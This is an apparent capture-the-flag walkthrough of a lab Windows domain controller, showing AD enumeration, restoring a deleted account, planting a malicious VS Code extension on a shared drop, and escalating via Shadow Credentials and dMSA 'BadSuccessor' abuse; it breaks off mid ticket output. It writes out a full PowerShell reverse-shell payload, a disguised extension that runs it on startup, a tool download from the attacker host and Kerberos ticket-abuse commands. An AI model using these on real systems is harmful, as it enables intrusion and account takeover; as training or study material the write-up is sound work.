\-----------------------------------------------------------------------------------------CheckPoint--------------------------------------------------------





Step:-1 Reconnaissance





nmap -A -sS -P -T4  --min-rate 5000 10.129.30.207

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-18 14:23 UTC

Nmap scan report for 10.129.30.207

Host is up (0.35s latency).

Not shown: 989 filtered tcp ports (no-response)

PORT     STATE SERVICE           VERSION

53/tcp   open  domain            Simple DNS Plus

88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-18 21:23:08Z)

135/tcp  open  msrpc             Microsoft Windows RPC

139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn

389/tcp  open  ldap

445/tcp  open  microsoft-ds?

464/tcp  open  kpasswd5?

593/tcp  open  ncacn\_http        Microsoft Windows RPC over HTTP 1.0

636/tcp  open  ldapssl?

3268/tcp open  ldap

3269/tcp open  globalcatLDAPssl?

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Device type: general purpose

Running (JUST GUESSING): Microsoft Windows 2022 (85%)

Aggressive OS guesses: Microsoft Windows Server 2022 (85%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 2 hops

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



Host script results:

|\_clock-skew: 6h59m03s

| smb2-security-mode:

|   3:1:1:

|\_    Message signing enabled and required

| smb2-time:

|   date: 2026-06-18T21:23:42

|\_  start\_date: N/A



TRACEROUTE (using port 445/tcp)

HOP RTT       ADDRESS

1   392.21 ms 10.10.14.1

2   393.16 ms 10.129.30.207



OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 96.66 seconds







\[#] Great!! a Medium Windows Box, this is gonna be fun!!!





\[#] They have also provided some initial creds as well --->  **alex.turner / Checkpoint2024!**







\[#] Lets do some SMB verifications!!





nxc smb checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!'



SMB         10.129.30.207   445    DC01             \[\*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)

SMB         10.129.30.207   445    DC01             \[+] checkpoint.htb\\alex.turner:Checkpoint2024!



\[#] Validated!





\[#] Lets look for users!



nxc smb checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --users



SMB         10.129.30.207   445    DC01             \[\*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)

SMB         10.129.30.207   445    DC01             \[+] checkpoint.htb\\alex.turner:Checkpoint2024!

SMB         10.129.30.207   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-

SMB         10.129.30.207   445    DC01             Administrator                 2026-05-09 16:16:34 0       Built-in account for administering the computer/domain

SMB         10.129.30.207   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain

SMB         10.129.30.207   445    DC01             krbtgt                        2026-05-09 08:41:01 0       Key Distribution Center Service Account

SMB         10.129.30.207   445    DC01             alex.turner                   2026-05-09 09:00:08 0

SMB         10.129.30.207   445    DC01             ryan.brooks                   2026-05-10 13:46:18 0

SMB         10.129.30.207   445    DC01             svc\_deploy                    2026-05-09 09:01:19 0       Deployment service account

SMB         10.129.30.207   445    DC01             james.harper                  2026-05-09 09:02:53 0

SMB         10.129.30.207   445    DC01             sarah.mitchell                2026-05-09 09:02:58 0

SMB         10.129.30.207   445    DC01             emily.carter                  2026-05-09 09:03:05 0

SMB         10.129.30.207   445    DC01             david.reynolds                2026-05-09 09:03:11 0

SMB         10.129.30.207   445    DC01             jessica.coleman               2026-05-09 09:03:15 0

SMB         10.129.30.207   445    DC01             lauren.flores                 2026-05-09 09:03:21 0

SMB         10.129.30.207   445    DC01             michael.torres                2026-05-09 09:03:28 0

SMB         10.129.30.207   445    DC01             kevin.patterson               2026-05-09 09:03:33 0

SMB         10.129.30.207   445    DC01             brian.jenkins                 2026-05-09 09:03:37 0

SMB         10.129.30.207   445    DC01             megan.perry                   2026-05-09 09:03:42 0

SMB         10.129.30.207   445    DC01             max.palmer                    2026-05-26 01:25:15 0

SMB         10.129.30.207   445    DC01             \[\*] Enumerated 17 local users: CHECKPOINT





\[#] Interesting! 17 Users. lets look for some Shares as well!







smbclient -L //checkpoint.htb -U 'alex.turner%Checkpoint2024!'





&#x20;       Sharename       Type      Comment

&#x20;       ---------       ----      -------

&#x20;       ADMIN$          Disk      Remote Admin

&#x20;       C$              Disk      Default share

&#x20;       DevDrop         Disk      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0

&#x20;       IPC$            IPC       Remote IPC

&#x20;       NETLOGON        Disk      Logon server share

&#x20;       SYSVOL          Disk      Logon server share

&#x20;       VMBackups       Disk

Reconnecting with SMB1 for workgroup listing.

do\_connect: Connection to checkpoint.htb failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)

Unable to connect with SMB1 -- no workgroup available







\[#] There is this  'VMBackups' Looks sus ! lets try reading it





&#x20;smbclient //checkpoint.htb/VMBackups -U 'checkpoint.htb\\alex.turner%Checkpoint2024!'



Try "help" to get a list of possible commands.

smb: \\> dir

NT\_STATUS\_ACCESS\_DENIED listing \\\*

smb: \\> pwd

Current directory is \\\\checkpoint.htb\\VMBackups\\

smb: \\> ls

NT\_STATUS\_ACCESS\_DENIED listing \\\*





\[#] Ahhh Access Denied !!





\[#] Also there was nothing interesting on the other shares!





\[#] Also lets look at the groups as well





nxc ldap 10.129.30.207 -u 'alex.turner' -p 'Checkpoint2024!' --groups



LDAP        10.129.30.207   389    DC01             \[\*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)

LDAP        10.129.30.207   389    DC01             \[+] checkpoint.htb\\alex.turner:Checkpoint2024!

LDAP        10.129.30.207   389    DC01             Administrators                           membercount: 3

LDAP        10.129.30.207   389    DC01             Users                                    membercount: 3

LDAP        10.129.30.207   389    DC01             Guests                                   membercount: 2

LDAP        10.129.30.207   389    DC01             Print Operators                          membercount: 0

LDAP        10.129.30.207   389    DC01             Backup Operators                         membercount: 0

LDAP        10.129.30.207   389    DC01             Replicator                               membercount: 0

LDAP        10.129.30.207   389    DC01             Remote Desktop Users                     membercount: 0

LDAP        10.129.30.207   389    DC01             Network Configuration Operators          membercount: 0

LDAP        10.129.30.207   389    DC01             Performance Monitor Users                membercount: 0

LDAP        10.129.30.207   389    DC01             Performance Log Users                    membercount: 0

LDAP        10.129.30.207   389    DC01             Distributed COM Users                    membercount: 0

LDAP        10.129.30.207   389    DC01             IIS\_IUSRS                                membercount: 1

LDAP        10.129.30.207   389    DC01             Cryptographic Operators                  membercount: 0

LDAP        10.129.30.207   389    DC01             Event Log Readers                        membercount: 0

LDAP        10.129.30.207   389    DC01             Certificate Service DCOM Access          membercount: 0

LDAP        10.129.30.207   389    DC01             RDS Remote Access Servers                membercount: 0

LDAP        10.129.30.207   389    DC01             RDS Endpoint Servers                     membercount: 0

LDAP        10.129.30.207   389    DC01             RDS Management Servers                   membercount: 0

LDAP        10.129.30.207   389    DC01             Hyper-V Administrators                   membercount: 0

LDAP        10.129.30.207   389    DC01             Access Control Assistance Operators      membercount: 0

LDAP        10.129.30.207   389    DC01             Remote Management Users                  membercount: 1

LDAP        10.129.30.207   389    DC01             Storage Replica Administrators           membercount: 0

LDAP        10.129.30.207   389    DC01             OpenSSH Users                            membercount: 0

LDAP        10.129.30.207   389    DC01             Domain Computers                         membercount: 0

LDAP        10.129.30.207   389    DC01             Domain Controllers                       membercount: 0

LDAP        10.129.30.207   389    DC01             Schema Admins                            membercount: 1

LDAP        10.129.30.207   389    DC01             Enterprise Admins                        membercount: 1

LDAP        10.129.30.207   389    DC01             Cert Publishers                          membercount: 0

LDAP        10.129.30.207   389    DC01             Domain Admins                            membercount: 2

LDAP        10.129.30.207   389    DC01             Domain Users                             membercount: 0

LDAP        10.129.30.207   389    DC01             Domain Guests                            membercount: 0

LDAP        10.129.30.207   389    DC01             Group Policy Creator Owners              membercount: 1

LDAP        10.129.30.207   389    DC01             RAS and IAS Servers                      membercount: 0

LDAP        10.129.30.207   389    DC01             Server Operators                         membercount: 0

LDAP        10.129.30.207   389    DC01             Account Operators                        membercount: 0

LDAP        10.129.30.207   389    DC01             Pre-Windows 2000 Compatible Access       membercount: 1

LDAP        10.129.30.207   389    DC01             Incoming Forest Trust Builders           membercount: 0

LDAP        10.129.30.207   389    DC01             Windows Authorization Access Group       membercount: 1

LDAP        10.129.30.207   389    DC01             Terminal Server License Servers          membercount: 0

LDAP        10.129.30.207   389    DC01             Allowed RODC Password Replication Group  membercount: 0

LDAP        10.129.30.207   389    DC01             Denied RODC Password Replication Group   membercount: 8

LDAP        10.129.30.207   389    DC01             Read-only Domain Controllers             membercount: 0

LDAP        10.129.30.207   389    DC01             Enterprise Read-only Domain Controllers  membercount: 0

LDAP        10.129.30.207   389    DC01             Cloneable Domain Controllers             membercount: 0

LDAP        10.129.30.207   389    DC01             Protected Users                          membercount: 0

LDAP        10.129.30.207   389    DC01             Key Admins                               membercount: 0

LDAP        10.129.30.207   389    DC01             Enterprise Key Admins                    membercount: 0

LDAP        10.129.30.207   389    DC01             Forest Trust Accounts                    membercount: 0

LDAP        10.129.30.207   389    DC01             External Trust Accounts                  membercount: 0

LDAP        10.129.30.207   389    DC01             IT-Staff                                 membercount: 3

LDAP        10.129.30.207   389    DC01             Finance-Staff                            membercount: 2

LDAP        10.129.30.207   389    DC01             HR-Staff                                 membercount: 2

LDAP        10.129.30.207   389    DC01             Engineering-Staff                        membercount: 4

LDAP        10.129.30.207   389    DC01             VPN-Users                                membercount: 4

LDAP        10.129.30.207   389    DC01             DevTeam                                  membercount: 3

LDAP        10.129.30.207   389    DC01             DnsAdmins                                membercount: 0

LDAP        10.129.30.207   389    DC01             DnsUpdateProxy                           membercount: 0

LDAP        10.129.30.207   389    DC01             BackupAccess                             membercount: 1





\[#] For some reasons, the standard BloodHound Zip fetcher tool wasn't working, so i found a workaround with bloodyAD





bloodyAD --host 10.129.32.9 -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get bloodhound

\[+] Connecting to LDAP server

\[+] Connected to LDAP serrver

Dumping schema: 2it \[00:01,  1.92it/s]

Generating lookuptable: 1it \[00:00,  4.22it/sGenerating lookuptable: 2it \[00:00,  1.96it/sGenerating lookuptable: 19it \[00:01, 21.15it/Generating lookuptable: 23it \[00:01, 12.73it/Generating lookuptable: 78it \[00:02, 57.05it/Generating lookuptable: 88it \[00:02, 35.94it/Generating lookuptable: 105it \[00:03, 40.90itGenerating lookuptable: 106it \[00:03, 30.89it/s]

Dumping SDs: 100%|█| 110/110 \[00:29<00:00,

Dumping domains: 100%|█| 1/1 \[00:00<00:00,

Dumping users: 100%|█| 17/17 \[00:00<00:00, 5

Dumping computers: 100%|█| 1/1 \[00:00<00:00,

Dumping groups: 100%|█| 58/58 \[00:00<00:00,

Dumping GPOs: 100%|█| 2/2 \[00:00<00:00,  7.4

Dumping OUs: 100%|█| 8/8 \[00:00<00:00, 29.17

Dumping Containers: 100%|█| 19/19 \[00:00<00:

\[+] Bloodhound data saved to 20260619T144130\_Bloodhound.zip

\[+] Found 0 trusts





\[#] After analyzing the bloodhound, i came to know that, there no outbound controls from Alex.turner. alex is member of 4 Groups, but none has outbound controls!





\[#]Instead, lets look up some writeables





bloodyAD -H DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get writable



distinguishedName: OU=Employees,DC=checkpoint,DC=htb

permission: CREATE\_CHILD



distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb

permission: WRITE



distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb

DACL: WRITE



distinguishedName: CN=Mark Davies\\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb

permission: WRITE



distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb

permission: WRITE



distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb

permission: CREATE\_CHILD



distinguishedName: DC=\_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb

permission: CREATE\_CHILD







\[#] The Writeable shows some critical information, as we have write privs over  CN=Deleted Objects, also we have the same permissions over CN=Employee, but The Employee OU doesn't have any Outbounds as i said before





\[#] We also have Generic Writes over Mark Davies, who's in retention, luckily we have the write permissions over the deleted OU, so maybe we can reanimate (restore) Mark!





\[#] lets try reanimating  him!



bloodyAD -H DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' set restore 'CN=Mark Davies\\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'



\[+] CN=Mark Davies\\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb







\[#] Nice, mark has been restored under, Employees OU, very nicee





\[#] Now we can take over Mark by setting up new password for him



\[#] I was forcefully trying to change the password for mark.davies with bloodyAD, and also tried shadowCreds, while both failed. cause of the LDAPS restrictions, as i can't directly change the password.

\[#] Well the interesting thing was, the password turns out to be the same as it is for alex idk why? maybe i am stupid! or maybe i am Charles Leclerc!



&#x20;nxc smb checkpoint.htb -u 'mark.davies' -p 'Checkpoint2024!'

SMB         10.129.34.54    445    DC01             \[\*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)

**SMB         10.129.34.54    445    DC01             \[+] checkpoint.htb\\mark.davies:Checkpoint2024!**









\[#] And maybe the GenricWrite could be a rabbit hole, as there is no bloodhound outbound control from mark, which proves it.





\[#] Anyways! the shares



smbclient -L //checkpoint.htb -U 'mark.davies%Checkpoint2024!'



&#x20;       Sharename       Type      Comment

&#x20;       ---------       ----      -------

&#x20;       ADMIN$          Disk      Remote Admin

&#x20;       C$              Disk      Default share

&#x20;       **DevDrop         Disk      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0**

&#x20;       IPC$            IPC       Remote IPC

&#x20;       NETLOGON        Disk      Logon server share

&#x20;       SYSVOL          Disk      Logon server share

&#x20;       VMBackups       Disk

Reconnecting with SMB1 for workgroup listing.

do\_connect: Connection to checkpoint.htb failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)

Unable to connect with SMB1 -- no workgroup available







\[#] A new share DevDrop, with VS code extension approval!





\[#] What is this share actually does? It is a centralized repository where developers or automated systems pull approved Visual Studio Code extensions (.vsix files) to install them on internal developer workstations.



\[#]Its a share from where the devs, install vs code Extensions.





\[#] Since we can write on this share, we can create a new extension which will give us an RCE!





\[#] Attack plan:-



&#x09;\[$] Will create a directory with 2 files, a json and a javascript with actual RCE code as extenstion

&#x09;\[$] Then will make a vsix extension file with the package and extension

&#x09;\[$] Then will upload it

&#x09;\[$] And will get the foothold!







Step-2: Initial Foothold





\[#] Setup Variables



LHOST="10.10.\*\*\*\*.\*\*\*\*" //kindly change with your IP

LPORT="4444"

&#x20;



//the payload

PAYLOAD="\\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\\$stream = \\$client.GetStream();\[byte\[]]\\$bytes = 0..65535|%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>\&1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + ' > ';\\$sendbyte = (\[text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()"

&#x20;



//base64 encoding

ENCODED=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w 0)







\[#] Create package.json with, compatible for vs code engine!





{

&#x20; "name": "devtools-helper",

&#x20; "displayName": "DevTools Helper",

&#x20; "version": "1.0.0",

&#x20; "engines": {"vscode": "^1.118.0"},

&#x20; "activationEvents": \["\*"],

&#x20; "main": "./extension.js",

&#x20; "contributes": {}

}







&#x20;

\[#] Create extension.json





const cp = require('child\_process');

exports.activate = function() {

&#x20;   cp.exec('powershell -e {your\_base64 will appear here}

}

exports.deactivate = function() {}







\[#] Now convert the directory into installable .vsix (vs code extension)



vsce package



&#x20;WARNING  A 'repository' field is missing from the 'package.json' manifest file.

Use --allow-missing-repository to bypass.

Do you want to continue? \[y/N] y

&#x20;WARNING  Using '\*' activation is usually a bad idea as it impacts performance.

More info: https://code.visualstudio.com/api/references/activation-events#Start-up

Use --allow-star-activation to bypass.

Do you want to continue? \[y/N] y

&#x20;WARNING  LICENSE, LICENSE.md, or LICENSE.txt not found

Do you want to continue? \[y/N] y

&#x20;WARNING  Neither a .vscodeignore file nor a "files" property in package.json was found. To ensure only necessary files are included in your extension, add a .vscodeignore file or specify the "files" property in package.json. More info: https://aka.ms/vscode-vscodeignore



&#x20;INFO  Files included in the VSIX:

devtools-helper-1.0.0.vsix

├─ \[Content\_Types].xml

├─ extension.vsixmanifest

└─ extension/

&#x20;  ├─ extension.js \[1.44 KB]

&#x20;  └─ package.json \[0.2 KB]



The file extension/extension.js is large (1.44 KB)



&#x20;DONE  Packaged: /root/evil-ext/extension/devtools-helper-1.0.0.vsix (4 files, 2.06 KB)







\[#] Upload





smbclient  //checkpoint.htb/DevDrop -U 'mark.davies%Checkpoint2024!'

Try "help" to get a list of possible commands.

smb: \\> del \*

smb: \\> put devtools-helper-1.0.0.vsix

putting file devtools-helper-1.0.0.vsix as \\devtools-helper-1.0.0.vsix (1.8 kB/s) (average 1.8 kB/s)





(note:- delete the previous vsix files if had any in the share)







\[#] On the listener



nc -lvnp 4444

listening on \[any] 4444 ...

connect to \[10.10.14.\*\*\*\*] from (UNKNOWN) \[10.129.34.54] 60072

whoami

checkpoint\\ryan.brooks

PS C:\\Program Files\\Microsoft VS Code >



\[#] you can get the user flag!





Step:-3 Privilege Escalation





\[#] So i have analyzed the bloodhound--> here's graph reps





&#x09;ryan.brooks

&#x09;    ↓

&#x20;     has GenericWrite

&#x09;    ↓

&#x09;svc\_deploy

&#x09;    ↓

&#x09; memberOf

&#x09;    ↓

Remote Management \& BackupAccess \& Domain Users







\[#] GenricWrite Again,  ShadowCreds attack Lets try it again!





\[#] Lets try adding the password for svc\_deploy via whisker





PS C:\\temp > .\\Whisker.exe add /target:svc\_deploy /path:C:\\Temp\\svc\_deploy.pfx /password:'P@ssw0rd'



\[\*] Searching for the target account

\[\*] Target user found: CN=svc\_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb

\[\*] Generating certificate

\[\*] Certificate generaged

\[\*] Generating KeyCredential

\[\*] KeyCredential generated with DeviceID f9656a34-f624-4630-8d1a-81f7f0ca9113

\[\*] Updating the msDS-KeyCredentialLink attribute of the target object

\[+] Updated the msDS-KeyCredentialLink attribute of the target object

\[\*] Saving the associated certificate to file...

\[\*] The associated certificate was saved to C:\\Temp\\svc\_deploy.pfx

\[\*] You can now run Rubeus with the following syntax:



Rubeus.exe asktgt /user:svc\_deploy /certificate:C:\\Temp\\svc\_deploy.pfx /password:"P@ssw0rd" /domain:checkpoint.htb /dc:DC01.checkpoint.htb /getcredentials /show







\[#] creds added, now lets use Rubeus to get tgt via PIKINIT



PS C:\\temp > PS C:\\temp > Invoke-WebRequest -Uri http://10.10.14.153:8000/Rubeus.exe -OutFile Rubeus.exe -UseBasicParsing

PS C:\\temp > .\\Rubeus.exe asktgt /user:svc\_deploy /certificate:C:\\Temp\\svc\_deploy.pfx /password:"P@ssw0rd" /domain:checkpoint.htb /dc:DC01.checkpoint.htb /getcredentials /show





&#x20;  \_\_\_\_\_\_        \_

&#x20; (\_\_\_\_\_ \\      | |

&#x20;  \_\_\_\_\_) )\_   \_| |\_\_  \_\_\_\_\_ \_   \_  \_\_\_

&#x20; |  \_\_  /| | | |  \_ \\| \_\_\_ | | | |/\_\_\_)

&#x20; | |  \\ \\| |\_| | |\_) ) \_\_\_\_| |\_| |\_\_\_ |

&#x20; |\_|   |\_|\_\_\_\_/|\_\_\_\_/|\_\_\_\_\_)\_\_\_\_/(\_\_\_/



&#x20; v2.1.2



\[\*] Action: Ask TGT



\[\*] Using PKINIT with etype rc4\_hmac and subject: CN=svc\_deploy

\[\*] Building AS-REQ (w/ PKINIT preauth) for: 'checkpoint.htb\\svc\_deploy'

\[\*] Using domain controller: fe80::1769:18da:e00a:d68a%5:88



\[X] KRB-ERROR (16) : KDC\_ERR\_PADATA\_TYPE\_NOSUPP





\[#] This DC does not supports PIKINIT, which makes the ShadowCreds attack a successful failure!









\[#] Since the ryan has GenericWrite over svc-deploy, means we can do object manipulation including dMSA





\[#] Now what is dMSA:- It is a migrated service account that is used to succeed a legacy service account (eg. any ldap object, who run services anywhere)





\[#] While the KDC links both the accounts, as one as a successor and the other one as a predecessor





\[#] There are mainly 2 attributes a dMSA account can have-



* msDS-ManagedAccountPrecededByLink → points to the original user (predecessor)
* msDS-DelegatedMSAState → state of migration (ready, completed, etc.)





&#x20;





\[#] Now the question was for me is, how the GenericWrite is gonna help here?- GenericwWite will help us to point back to our account back



\[#] One more question. Why do we need to point back to the attacker controlled dMSA again? isn't the one-way link is sufficient? Because After the patch of windows server 2025. the one way link, Badsuccessor was completely patched and fixed, before the patch, the domain controller was completely ignoring the Predecessor's attribute such as msDS-SupersededManagedAccountLink
which points back to the attacker controlled account. but after the patch they have fixed this Design flaw and made it two-way linking





\[#] So now we need to link both ways, to successfully takeover the svc\_deploy







\[#] Now that we know that this attack vector can be used in account takeover, but first we need to check if the ryan.brooks also has CreateChild permissions over, every Domain has their own dMSAHolder accounts, for this machine it is  **OU=DMSAHolder,DC=checkpoint,DC=htb**





\[#] Now we have what to do (badsuccessor linking), and where to do (OU=DMSAHolder), now the question is, can we (ryan.brooks) do this ?





\[#] Lets check it via PowerView.ps1



PS C:\\temp >  Import-Module .\\PowerView.ps1

PS C:\\temp > Get-DomainObjectAcl -Identity "OU=DMSAHolder,DC=checkpoint,DC=htb" -ResolveGUIDs



**AceType               : AccessAllowed**

**ObjectDN              : OU=DMSAHolder,DC=checkpoint,DC=htb**

ActiveDirectoryRights : CreateChild

OpaqueLength          : 0

ObjectSID             :

InheritanceFlags      : ContainerInherit

BinaryLength          : 36

IsInherited           : False

IsCallback            : False

PropagationFlags      : None

SecurityIdentifier    : S-1-5-21-3129162710-3498938529-1807524340-1103

AccessMask            : 1

AuditFlags            : None

AceFlags              : ContainerInherit

AceQualifier          : AccessAllowed







\[#] As expected, we have the access to create child at DMSAHOlder OU, so we can create our own dmsaAccount to ou=DMSAHolder







\[#] Proper Attack path



\[ryan.brooks]

&#x20;     |

&#x20;     +--> \[CreateChild on OU=DMSAHolder]

&#x20;     |          |

&#x20;     |          v

&#x20;     |    \[create attacker-controlled dMSA]

&#x20;     |

&#x20;     +--> \[GenericWrite on svc\_deploy]

&#x20;                |

&#x20;                v

&#x20;\[write pairing attributes on both sides]

&#x20;     |

&#x20;     +--> \[dMSA object: msDS-GroupMSAMembership]

&#x20;     |                  msDS-ManagedAccountPrecededByLink  //will point to svc\_deploy

&#x20;     |

&#x20;     +--> \[svc\_deploy object: msDS-SupersededManagedAccountLink]

&#x20;                        msDS-SupersededServiceAccountState   //will point back to attacker controlled account!

&#x20;     |

&#x20;     v

\[DC validates mutual pairing]

&#x20;     |

&#x20;     v

\[request TGT for dMSA]

&#x20;     |

&#x20;     v

\[PAC reflects svc\_deploy identity]





\[#] We can literally impersonate the user svc\_deploy by this.









\[#] Lets execute the plan!







\[#] Lets start by adding an attacker controlled dmsa object to the intended OU





PS C:\\Temp> PS C:\\Temp> .\\SharpSuccessor.exe add /impersonate:svc\_deploy /path:"OU=DMSAHolder,DC=checkpoint,DC=htb" /account:ryan.brooks /name:attacker\_dmsa

&#x20;  \_\_\_\_\_ \_                      \_\_\_\_\_

&#x20; / \_\_\_\_| |                    / \_\_\_\_|

&#x20;| (\_\_\_ | |\_\_   \_\_ \_ \_ \_\_ \_ \_\_| (\_\_\_  \_   \_  \_\_\_ \_\_\_ \_\_\_  \_\_\_ \_\_\_  \_\_\_  \_ \_\_

&#x20; \\\_\_\_ \\| '\_ \\ / \_` | '\_\_| '\_ \\\\\_\_\_ \\| | | |/ \_\_/ \_\_/ \_ \\/ \_\_/ \_\_|/ \_ \\| '\_\_|

&#x20; \_\_\_\_) | | | | (\_| | |  | |\_) |\_\_\_) | |\_| | (\_| (\_|  \_\_/\\\_\_ \\\_\_ \\ (\_) | |

&#x20;|\_\_\_\_\_/|\_| |\_|\\\_\_,\_|\_|  | .\_\_/\_\_\_\_\_/ \\\_\_,\_|\\\_\_\_\\\_\_\_\\\_\_\_||\_\_\_/\_\_\_/\\\_\_\_/|\_|

&#x20;                        | |

&#x20;                        |\_|

@\_logangoins



\[+] Adding dnshostname attacker\_dmsa.checkpoint.htb

\[+] Adding samaccountname attacker\_dmsa$

\[+] svc\_deploy's DN identified

**\[+] Attempting to write msDS-ManagedAccountPrecededByLink**

\[+] Wrote attribute successfully

\[+] Attempting to write msDS-DelegatedMSAState attribute

\[+] Attempting to set access rights on the dMSA object

\[+] Attempting to write msDS-SupportedEncryptionTypes attribute

\[+] Attempting to write userAccountControl attribute

\[+] Created dMSA object 'CN=attacker\_dmsa' in 'OU=DMSAHolder,DC=checkpoint,DC=htb'

\[+] Successfully weaponized dMSA object

\[+] Found target account, attempting to write attributes

\[+] CN=attacker\_dmsa,OU=DMSAHolder,DC=checkpoint,DC=htb written to svc\_deploy object

**\[+] msDS-SupersededServiceAccountState set to 2**

\[+] Wrote to target account successfully 



&#x20;



\[#] SharpSucessor wrote both the attributes and liked both the objects 









\[#] Now that they are linked, we can validate them and can get a TGS, but before requesting for the TGS we must need a TGT as the current user, to be provided in the request



$t = .\\Rubeus.exe tgtdeleg /nowrap | Out-String

$b64 = ($t -split 'base64\\(ticket.kirbi\\):')\[1] -replace '\\s+',''

\[IO.File]::WriteAllBytes('C:\\Temp\\ryan\_tgt.kirbi',\[Convert]::FromBase64String($b64))







\[#] The ticket is saved, so now we can ask for dmsa\_backed TGS. 





PS C:\\Temp> .\\Rubeus.exe asktgs /targetuser:attacker\_dmsa$ /service:krbtgt/checkpoint.htb /opsec /dmsa /nowrap /ptt /ticket:C:\\Temp\\ryan\_tgt.kirbi



&#x20;  \_\_\_\_\_\_        \_

&#x20; (\_\_\_\_\_ \\      | |

&#x20;  \_\_\_\_\_) )\_   \_| |\_\_  \_\_\_\_\_ \_   \_  \_\_\_

&#x20; |  \_\_  /| | | |  \_ \\| \_\_\_ | | | |/\_\_\_)

&#x20; | |  \\ \\| |\_| | |\_) ) \_\_\_\_| |\_| |\_\_\_ |

&#x20; |\_|   |\_|\_\_\_\_/|\_\_\_\_/|\_\_\_\_\_)\_\_\_\_/(\_\_\_/



&#x20; v2.3.3



\[\*] Action: Ask TGS



\[\*] Requesting default etypes (RC4\_HMAC, AES\[128/256]\_CTS\_HMAC\_SHA1) for the service ticket

\[\*] Building DMSA TGS-REQ request for 'attacker\_dmsa$' from 'ryan.brooks'

\[+] Sequence number is: 884855162

\[\*] Using domain controller: DC01.checkpoint.htb (fe80::b1a3:9287:d9bc:fa42%5)

\[+] TGS request successful!

\[+] Ticket successfully imported!

\[\*] base64(ticket.kirbi):



&#x20;     doIF+jCCBfagAwIBBaEDAgEWooIE8zCCBO9hggTrMIIE56ADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBKcwggSjoAMCARKhAwIBAqKCBJUEggSRTSw0wkipLidAGNzDIDHJAtLDqCNp8hzLKJV3tmAEsYMZfblZgSfu1KLKxcEGS85PiYdWHyTfIcrdOI

KGamic8RLT+hQLhEHlhRotTPTEPrFqaVr5podDvEXeLjJ98ENCSe6a1vx3R+4HE+ev1BctT0wb8hEeSiSG+AgrAE6l2UF0bDnGdmaB/n/vnpmk4GENiyvjymRrASiJQ4p71futMz6A03s/s6tv2d6Due6woNMUWaT+HXC0cxFoYfSl0hW0N0OXX5esUIMrjQeWHVfDpaE66BB89++GhwXNWC+RbmyfRy2oZikjuOw7CtBD/W/qeD

qG0CJktZFB95xBnDyo/Jctc0CV1vQL1WDvIxjZ+9YM/HPfFGQcx2hmzB47rsftBZxbd/NRnbs5gsgEsVwq2szOYwgh6I1opT/RGZ3zEjflOmdp9Ado7jXTyWV+1mLgHMkcnCvY8V0eSfDZj0+jct3Y/w4pG7Z33U84zS3/ITFql05WGc7wxplnYjOOAeF3DmHz5QMjpzl7a90Ttnd6ToH1sSasdWyEjd7N8MEpSOLtAG1w7hZc0A

HMTj4m6K4XAgLEd2+JwY8Omqy2NthiuBgGt3lOKoqn1Dpced+pJLzoHDxDO4imndxebX/lGrQGmvdG3EjQBT6yB5KFPN7DJj76WEDfV4cLcDnnUoEijmbI0JJy7ULeL/HIQmnNYFc3L7sfvxDhGAeco4pC2bLI/c2Fub4LGChZlAA1XLHn2ce5M5Pj0GwhTgVn5o/6HF0Xng6zvP5xhoIRHlGO52YZwNDDnRtGafp0h2ap+SO17b

